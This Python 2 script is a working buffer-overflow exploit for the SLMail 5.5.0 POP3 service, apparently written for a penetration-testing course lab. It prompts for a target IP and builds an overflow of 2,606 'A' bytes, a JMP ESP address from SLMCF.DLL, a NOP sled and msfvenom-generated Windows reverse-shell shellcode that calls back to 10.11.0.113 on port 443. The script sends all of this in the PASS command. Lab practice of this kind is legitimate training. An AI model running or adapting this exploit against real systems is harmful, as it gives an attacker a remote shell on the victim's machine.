#!/usr/bin/python

#
# Exploit for SLMail 5.5.0 Mail Server
# Written by Joseph McPeters
#
# Based off code from offsec /THANK YOU!
#
# Tested on Windows 7 Enterprise SP1
#

import socket


target = raw_input("Please enter target IP address: ")


# msfvenom -p windows/shell_reverse_tcp -b '\x00\x0d\x0a' EXITFUNC=thread LHOST=10.11.0.113 LPORT=443 -f python
# Payload: windows/shell_reverse_tcp
# Payload size: 351 bytes
buf =  ""
buf += "\xba\xb6\xe8\xb0\x3d\xdb\xce\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\xe0\xe6\x52"
buf += "\xc8\xf0\x1f\x10\x33\x08\xe0\x75\xbd\xed\xd1\xb5\xd9"
buf += "\x66\x41\x06\xa9\x2a\x6e\xed\xff\xde\xe5\x83\xd7\xd1"
buf += "\x4e\x29\x0e\xdc\x4f\x02\x72\x7f\xcc\x59\xa7\x5f\xed"
buf += "\x91\xba\x9e\x2a\xcf\x37\xf2\xe3\x9b\xea\xe2\x80\xd6"
buf += "\x36\x89\xdb\xf7\x3e\x6e\xab\xf6\x6f\x21\xa7\xa0\xaf"
buf += "\xc0\x64\xd9\xf9\xda\x69\xe4\xb0\x51\x59\x92\x42\xb3"
buf += "\x93\x5b\xe8\xfa\x1b\xae\xf0\x3b\x9b\x51\x87\x35\xdf"
buf += "\xec\x90\x82\x9d\x2a\x14\x10\x05\xb8\x8e\xfc\xb7\x6d"
buf += "\x48\x77\xbb\xda\x1e\xdf\xd8\xdd\xf3\x54\xe4\x56\xf2"
buf += "\xba\x6c\x2c\xd1\x1e\x34\xf6\x78\x07\x90\x59\x84\x57"
buf += "\x7b\x05\x20\x1c\x96\x52\x59\x7f\xff\x97\x50\x7f\xff"
buf += "\xbf\xe3\x0c\xcd\x60\x58\x9a\x7d\xe8\x46\x5d\x81\xc3"
buf += "\x3f\xf1\x7c\xec\x3f\xd8\xba\xb8\x6f\x72\x6a\xc1\xfb"
buf += "\x82\x93\x14\xab\xd2\x3b\xc7\x0c\x82\xfb\xb7\xe4\xc8"
buf += "\xf3\xe8\x15\xf3\xd9\x80\xbc\x0e\x8a\xa4\x4b\x10\x3b"
buf += "\xd1\x49\x10\xba\x9a\xc7\xf6\xd6\xcc\x81\xa1\x4e\x74"
buf += "\x88\x39\xee\x79\x06\x44\x30\xf1\xa5\xb9\xff\xf2\xc0"
buf += "\xa9\x68\xf3\x9e\x93\x3f\x0c\x35\xbb\xdc\x9f\xd2\x3b"
buf += "\xaa\x83\x4c\x6c\xfb\x72\x85\xf8\x11\x2c\x3f\x1e\xe8"
buf += "\xa8\x78\x9a\x37\x09\x86\x23\xb5\x35\xac\x33\x03\xb5"
buf += "\xe8\x67\xdb\xe0\xa6\xd1\x9d\x5a\x09\x8b\x77\x30\xc3"
buf += "\x5b\x01\x7a\xd4\x1d\x0e\x57\xa2\xc1\xbf\x0e\xf3\xfe"
buf += "\x70\xc7\xf3\x87\x6c\x77\xfb\x52\x35\x97\x1e\x76\x40"
buf += "\x30\x87\x13\xe9\x5d\x38\xce\x2e\x58\xbb\xfa\xce\x9f"
buf += "\xa3\x8f\xcb\xe4\x63\x7c\xa6\x75\x06\x82\x15\x75\x03"

# SLMCF.DLL - JMP ESP
#payload = "A" * 2606 + "\x8f\x35\x4a\x5f" + ("\x90" * 8) + buf
payload = "A" * 2606 + "\x8f\x35\x4a\x5f" + ("\x90" * 16) + buf + "C" * (3500-2606-4-351-16)

try:
	print "[*] Sending evil buffer..."
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((target, 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS " + payload + "\r\n")
	print "\nDone!"

except:
	print "[!] Could not connect to POP3!"
